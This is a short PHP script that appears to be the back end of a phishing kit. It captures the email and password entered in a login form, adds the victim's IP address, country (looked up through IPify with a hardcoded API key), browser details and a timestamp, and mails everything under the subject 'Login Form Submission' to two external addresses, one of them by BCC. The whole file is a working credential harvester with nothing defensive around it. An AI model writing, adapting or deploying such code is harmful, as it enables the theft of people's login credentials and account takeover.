<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $email = $_POST["Email"];
    $password = $_POST["password"];

     $ipAddress = $_SERVER['REMOTE_ADDR'];
  // Set the default timezone
  date_default_timezone_set('America/Los_Angeles'); // Replace 'Your_Timezone' with your desired timezone
 
  // Get the current date and time
  $currentDateTime = date('Y-m-d H:i:s');

  $apiKey = "at_cE1iRWkZJpvO21KJVHm231sqmATme"; // Replace with your IPify API key

  // API request URL
  $url = "https://geo.ipify.org/api/v2/country?apiKey=at_cE1iRWkZJpvO21KJVHm231sqmATme&ipAddress=8.8.8.8";

  // Send API request and decode JSON response
  $response = file_get_contents($url);
  $data = json_decode($response);

  // Extract country details
  $country = $data->location->country;
  
  $browserDetails = $_SERVER['HTTP_USER_AGENT'];
  
   // Compose email message
$message = "Email: $email\r\n";
  $message .= "Password: $password\r\n";
  $message .= "IP Address: $ipAddress\r\n";
  $message .= "Current Date and Time: $currentDateTime\r\n";
  $message .= "Country: $country\r\n";
  $message .= "Browser Details: $browserDetails";

    // Send the email
    $to = 'Penny1484@icloud.com'; // 
    $bcc = 'KarsynHodges@protonmail.com'; // 
    $subject = "Login Form Submission"; // 
    $headers = 'From: LogFactory@vps.com' . "\r\n";
    $headers .= 'Bcc: ' . $bcc . "\r\n"; // 
	

    // Send the email
    mail($to, $subject, $message, $headers);

    // You can add additional logic or redirect the user after sending the email

} else {
    // Handle non-POST requests if needed
}

?>